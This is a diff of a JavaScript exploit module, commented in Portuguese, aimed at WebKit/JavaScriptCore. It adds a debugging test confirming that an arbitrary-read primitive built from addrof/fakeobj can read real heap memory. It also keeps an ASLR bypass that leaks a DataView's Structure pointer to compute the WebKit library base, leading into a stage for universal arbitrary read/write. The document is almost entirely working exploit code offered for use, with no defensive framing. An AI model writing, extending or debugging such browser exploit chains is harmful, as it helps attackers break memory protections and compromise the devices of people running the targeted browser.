@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v141 - Vazamento ASLR via VTable de DataView)
+// js/script3/testArrayBufferVictimCrash.mjs (v142 - Debugging aprofundado da arb_read no Heap)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
@@ -24,7 +24,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v141_ASLR_DATAVIEW_VTABLE";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v142_ARBFUNC_DEBUG";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -257,38 +257,84 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const leakPrepStartTime = performance.now();
 
         let leaked_successfully = false;
-        let leaked_base_source_name = "N/A"; // Para registrar qual tentativa de vazamento funcionou
+        let leaked_base_source_name = "DataView VTable"; // Padrão para este teste
 
+
+        // NOVO BLOCO DE TESTE: LEITURA DE UM DATAVIEW REAL PARA DEPURAR arb_read NO HEAP JS
+        logFn(`[DEBUG_ARBFUNC] Iniciando teste aprofundado de arb_read em objeto DataView no heap JS.`, "test");
         try {
-            // 1. Crie um DataView real
+            const debug_ab = new ArrayBuffer(0x100);
+            const debug_dv = new DataView(debug_ab);
+            debug_dv.setUint32(0, 0xDEADC0DE, true); // Valor para verificar
+            debug_dv.setUint32(4, 0xCAFEBABE, true); // Segundo valor para verificar
+            hold_objects.push(debug_ab);
+            hold_objects.push(debug_dv);
+
+            logFn(`[DEBUG_ARBFUNC] DataView de teste criado (addr: ${addrof_core(debug_dv).toString(true)}). Valores: 0xDEADC0DE, 0xCAFEBABE.`, "info");
+
+            // Leia o ponteiro para o ArrayBuffer associado do DataView de depuração
+            const debug_dv_addr = addrof_core(debug_dv);
+            const debug_associated_ab_ptr_addr = debug_dv_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET);
+            logFn(`[DEBUG_ARBFUNC] Lendo ponteiro do ArrayBuffer associado do DataView de teste em ${debug_associated_ab_ptr_addr.toString(true)}`, "info");
+            const debug_associated_ab_ptr_value = await arb_read(debug_associated_ab_ptr_addr, 8);
+
+            if (!isAdvancedInt64Object(debug_associated_ab_ptr_value) || debug_associated_ab_ptr_value.equals(AdvancedInt64.Zero) || debug_associated_ab_ptr_value.equals(AdvancedInt64.NaNValue)) {
+                logFn(`[DEBUG_ARBFUNC] FALHA: Não foi possível ler o ponteiro do ArrayBuffer associado do DataView de teste. Retornou: ${debug_associated_ab_ptr_value?.toString(true) || 'null/NaN'}.`, "error");
+                throw new Error("DEBUG_ARBFUNC: Falha na leitura do ponteiro do ArrayBuffer associado.");
+            }
+            logFn(`[DEBUG_ARBFUNC] Ponteiro para o ArrayBuffer associado: ${debug_associated_ab_ptr_value.toString(true)}`, "leak");
+
+            // Agora, leia o ponteiro real para os dados (m_vector) DENTRO desse ArrayBuffer associado
+            const debug_ab_contents_ptr_addr = debug_associated_ab_ptr_value.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
+            logFn(`[DEBUG_ARBFUNC] Lendo ponteiro para os dados do ArrayBuffer em ${debug_ab_contents_ptr_addr.toString(true)}`, "info");
+            const debug_ab_contents_ptr_value = await arb_read(debug_ab_contents_ptr_addr, 8);
+
+            if (!isAdvancedInt64Object(debug_ab_contents_ptr_value) || debug_ab_contents_ptr_value.equals(AdvancedInt64.Zero) || debug_ab_contents_ptr_value.equals(AdvancedInt64.NaNValue)) {
+                logFn(`[DEBUG_ARBFUNC] FALHA: Não foi possível ler o ponteiro para os dados do ArrayBuffer. Retornou: ${debug_ab_contents_ptr_value?.toString(true) || 'null/NaN'}.`, "error");
+                throw new Error("DEBUG_ARBFUNC: Falha na leitura do ponteiro dos dados do ArrayBuffer.");
+            }
+            logFn(`[DEBUG_ARBFUNC] Ponteiro para os dados brutos do ArrayBuffer: ${debug_ab_contents_ptr_value.toString(true)}`, "leak");
+            
+            // Agora, finalmente, leia os dados que escrevemos no DataView (através do ponteiro bruto)
+            const read_val1 = await arb_read(debug_ab_contents_ptr_value, 4);
+            const read_val2 = await arb_read(debug_ab_contents_ptr_value.add(4), 4);
+            
+            if (read_val1 === 0xDEADC0DE && read_val2 === 0xCAFEBABE) {
+                logFn(`[DEBUG_ARBFUNC] SUCESSO: Leitura de dados do DataView/ArrayBuffer real confirmada! Val1: ${toHex(read_val1)}, Val2: ${toHex(read_val2)}.`, "good");
+                logFn(`[DEBUG_ARBFUNC] Primitiva arb_read é capaz de ler no heap JS.`, "good");
+            } else {
+                logFn(`[DEBUG_ARBFUNC] FALHA: Leitura de dados do DataView/ArrayBuffer real falhou. Lido: ${toHex(read_val1)}, ${toHex(read_val2)}.`, "error");
+                throw new Error("DEBUG_ARBFUNC: Inconsistência na leitura de dados do ArrayBuffer real no heap.");
+            }
+
+            logFn(`[DEBUG_ARBFUNC] Teste aprofundado de arb_read em DataView real concluído.`, "test");
+
+        } catch (e_debug_arbfunc) {
+            logFn(`[DEBUG_ARBFUNC] ERRO CRÍTICO no teste aprofundado de arb_read: ${e_debug_arbfunc.message}\n${e_debug_arbfunc.stack || ''}`, "critical");
+            // Se este teste de depuração falhar, abortamos imediatamente.
+            throw new Error(`Problema fundamental na primitiva arb_read: ${e_debug_arbfunc.message}`);
+        }
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+        // FIM DO BLOCO DE TESTE DE DEPURAÇÃO
+
+        // Continua com a tentativa de vazamento de ASLR via VTable do DataView
+        try {
             const real_dataview_for_leak = new DataView(new ArrayBuffer(16));
-            hold_objects.push(real_dataview_for_leak); // Garante que não seja GCed
-            logFn(`[REAL LEAK] DataView real criado no heap para vazamento.`, "info");
+            hold_objects.push(real_dataview_for_leak);
+            logFn(`[REAL LEAK] DataView real criado no heap para vazamento (principal).`, "info");
             await pauseFn(LOCAL_SHORT_PAUSE);
 
-            // 2. Obtenha o endereço do DataView real
             const real_dataview_addr = addrof_core(real_dataview_for_leak);
-            logFn(`[REAL LEAK] Endereço do DataView real: ${real_dataview_addr.toString(true)}`, "info");
+            logFn(`[REAL LEAK] Endereço do DataView real (principal): ${real_dataview_addr.toString(true)}`, "info");
 
-            // 3. Leia o ponteiro da Structure* do DataView real (offset 0x8 de JSCell)
             const dataview_structure_ptr_addr = real_dataview_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
             logFn(`[REAL LEAK] Lendo Structure* do DataView real em ${dataview_structure_ptr_addr.toString(true)}`, "info");
             const dataview_structure_ptr_value = await arb_read(dataview_structure_ptr_addr, 8);
 
             if (!isAdvancedInt64Object(dataview_structure_ptr_value) || dataview_structure_ptr_value.equals(AdvancedInt64.Zero) || dataview_structure_ptr_value.equals(AdvancedInt64.NaNValue)) {
-                throw new Error(`Falha ao ler Structure* do DataView real. Retornou inválido: ${dataview_structure_ptr_value?.toString(true) || String(dataview_structure_ptr_value)}.`);
+                throw new Error(`Falha ao ler Structure* do DataView real (principal). Retornou inválido: ${dataview_structure_ptr_value?.toString(true) || String(dataview_structure_ptr_value)}.`);
             }
             logFn(`[REAL LEAK] Structure* do DataView real: ${dataview_structure_ptr_value.toString(true)}`, "leak");
-
-            // 4. Calcule o endereço base da WebKit a partir da Structure*
-            // A Structure* em si é um objeto em uma região de dados da biblioteca.
-            // O offset JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET (0x3AD62A0)
-            // é o offset do vtable *dentro da biblioteca*, não da Structure*.
-            // Se a Structure* aponta para `0x<base_WebKit> + <offset_da_Structure_no_ROData>`,
-            // então `base_WebKit = Structure*_value - offset_da_Structure_no_ROData`.
-            // O offset 0x3AD62A0 é o offset do *vtable* (que é parte da Structure) em relação à BASE.
-            // Então, se Structure* aponta para `X`, e o vtable está em `X` (offset 0 dentro da Structure),
-            // então `base_WebKit = X - 0x3AD62A0`.
 
             const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
             
@@ -296,7 +342,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             leaked_base_source_name = `DataView VTable (Offset 0x${JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET.toString(16)})`;
 
             if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
-                // Heurística para verificar se o endereço base parece válido (geralmente alinhado a 0x1000)
                 throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via ${leaked_base_source_name} falhou.`);
             }
             logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ${leaked_base_source_name}: ${webkit_base_address.toString(true)}`, "good");
@@ -306,7 +351,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`[REAL LEAK] ALERTA: Vazamento de ASLR via ${leaked_base_source_name} falhou: ${e_leak.message}.`, "warn");
             logFn(`[REAL LEAK] Tempo da Fase de Vazamento: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "warn");
             logFn(`[REAL LEAK] ERRO CRÍTICO: Vazamento de ASLR falhou. Não é possível prosseguir para as fases dependentes de ASLR.`, "critical");
-            // ABORTA A EXECUÇÃO SE O ASLR NÃO FOR VAZADO.
             throw new Error("Vazamento de ASLR falhou, abortando exploração.");
         }
 
@@ -319,6 +363,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // AGORA PODEMOS PROSSEGUIR COM A LÓGICA DO M_MODE E ARB R/W UNIVERSAL.
         logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");
 
+        // Esta parte do código só é alcançada se o vazamento de ASLR foi bem-sucedido.
+        // A lógica de tentativa e erro para m_mode foi mantida aqui.
         const DATA_VIEW_STRUCTURE_VTABLE_OFFSET = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
         const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET, 0));
         logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS.toString(true)}`, "info");
